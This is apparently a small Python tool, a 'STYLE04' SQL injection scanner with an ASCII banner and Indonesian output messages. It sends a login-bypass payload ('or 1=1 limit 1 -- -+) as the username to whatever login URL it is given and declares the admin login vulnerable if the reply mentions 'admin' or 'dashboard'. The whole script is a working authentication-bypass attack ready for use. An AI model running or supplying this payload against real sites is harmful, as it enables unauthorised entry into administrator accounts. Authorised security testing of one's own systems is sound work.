import requests
import argparse

# Banner STYLE04
BANNER = """

   _____________  ____    __________  __ __
  / ___/_  __/\ \/ / /   / ____/ __ \/ // /
  \__ \ / /    \  / /   / __/ / / / / // /_
 ___/ // /     / / /___/ /___/ /_/ /__  __/
/____//_/     /_/_____/_____/\____/  /_/   
                                           
          STYLE04 sql injection Scanner
"""

print(BANNER)

def test_sqli(url):
    payload = "'or 1=1 limit 1 -- -+"  # Payload SQL Injection
    data = {
        "username": payload,
        "password": "password"
    }

    try:
        response = requests.post(url, data=data, timeout=5)

        if "admin" in response.text.lower() or "dashboard" in response.text.lower():
            print("[CRITICAL] Admin login rentan terhadap SQL Injection!")
        else:
            print("[ERROR] Tidak rentan terhadap SQL Injection.")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Gagal mengakses URL: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple SQLi Scanner - STYLE04")
    parser.add_argument("url", help="URL halaman login yang ingin diuji")
    args = parser.parse_args()

    print(f"[INFO] Menguji {args.url} ...")
    test_sqli(args.url)